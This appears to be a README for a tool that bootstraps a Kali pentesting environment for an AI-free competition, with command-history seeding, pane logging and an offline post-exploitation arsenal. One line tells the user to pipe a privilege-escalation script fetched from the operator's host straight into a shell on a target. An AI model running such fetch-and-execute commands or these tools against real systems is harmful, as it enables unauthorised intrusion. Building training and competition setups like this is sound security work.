# curtain-call

Bootstrap a bare-metal **Kali** box toward the **Exegol** feel, for an AI-free
pentest competition. It front-loads onto your box the things you'd otherwise ask
an AI for mid-engagement: fast command recall, always-on evidence logging, and
the offline tool arsenal.

Three layers, nothing more:

1. **Shell env + always-on logging** — zsh history tuned for fuzzy `Ctrl-R`, a
   tmux config that auto-logs every pane to a readable file, and your Exegol
   `target`/tun0 status bar.
2. **Seeded `Ctrl-R` history** — a curated corpus of real commands
   (`shell/history.seed`). Press `Ctrl-R`, type a keyword, edit, run. This is
   the no-AI recall layer.
3. **Tools** — a thin apt/pipx gap-filler for the operator toolkit, plus an
   offline "drop on target" arsenal (linpeas, pspy, chisel, ligolo, SharpHound,
   potatoes…) mirroring Exegol's `exegol-resources`.

## Division of labour with `kiss`

`curtain-call` is the **OS environment**. The team dashboard
[`kiss`](https://github.com/sohcato/kiss) is the **engagement workspace** and
owns findings, credentials, scope, evidence, the parameterized cheatsheet, and
the LaTeX report. curtain-call deliberately does **not** duplicate those — use
kiss for anything that ends up in the report.

## Quick start (on your Kali box, before the competition — needs internet)

```bash
git clone <this repo> ~/curtain-call && cd ~/curtain-call
./install.sh            # shell + history + tools
./install.sh --resources   # download the drop-on-target arsenal (optional, large)
exec zsh                # or open a new terminal
```

Re-run any step after editing files here — it's idempotent and sources configs
from the repo in place:

```bash
./install.sh --shell       # zsh/tmux + logging
./install.sh --history     # re-seed Ctrl-R history after editing history.seed
./install.sh --tools       # apt + pipx + chisel/ligolo-proxy
./install.sh --resources   # refresh the arsenal (add --force to re-download)
```

## Using it under pressure

```bash
target 10.10.10.10 dc01.corp.local corp.local   # sets $IP/$TARGET + /etc/hosts
export DOMAIN=corp.local ; export SUBNET=10.10.10.0/24
lhost                                            # sets $LHOST from tun0
```

Now `Ctrl-R`, type e.g. `kerberoast` / `linpeas` / `chisel` — the matching
command comes up with `$IP`, `$DOMAIN`, `$LHOST`, `$SUBNET` already filled in.
Edit the creds, run.

- **Logs:** every tmux pane is logged to `~/.curtain-call/logs/` automatically.
  `cc-logs tail` follows the latest, `cc-logs grep PATTERN` searches them,
  `tmux-prefix + P` toggles logging for a pane. Great raw evidence for the report.
- **Serve the arsenal:** `www` starts an HTTP server over `resources/`. On a
  target: `curl http://$LHOST/linux/linpeas.sh | sh`.

## Layout

```
install.sh              orchestrator (idempotent; --shell/--history/--tools/--resources)
shell/
  curtain-call.zsh      sourced from ~/.zshrc: history opts, fzf Ctrl-R, PATH
  aliases.zsh           target() / lhost() workflow + a few aliases
  history.seed          the Ctrl-R corpus — EDIT THIS to add your own commands
  tmux.conf.in          logging hooks + target/tun0 status bar (rendered on install)
bin/
  cc-log-filter         ANSI-stripping pane logger (used by tmux)
  cc-logs               list/tail/grep the logs
tools/
  install-tools.sh      apt.list + pipx.list + chisel/ligolo-proxy
resources/
  fetch-resources.sh    downloads the offline drop-on-target arsenal
lib/                    shared bash helpers
```

## As a submodule

Lives happily under the team repo:

```bash
git submodule add <this repo> University-of-California-Berkeley/curtain-call
```

Downloaded binaries under `resources/` are git-ignored (large, go stale); each
teammate runs `./install.sh --resources` to populate them. No secrets are stored
in the repo.

## Notes / caveats

- Run as your normal user, not root — shell config lands in that user's home;
  the installer calls `sudo` only for apt and `/etc/hosts`.
- Tool/arsenal downloads need internet — do them **before** the competition.
  Pinned to each project's *latest* release at fetch time; re-run to refresh.
- The installer backs up `~/.zshrc`/`~/.tmux.conf` once to `*.curtain-call.bak`
  and only ever rewrites its own guarded block, so it won't clobber your configs.
- Pane logs capture raw terminal output; full-screen TUIs (vim, less) still leave
  some noise. Good enough as evidence; not a substitute for deliberate notes.
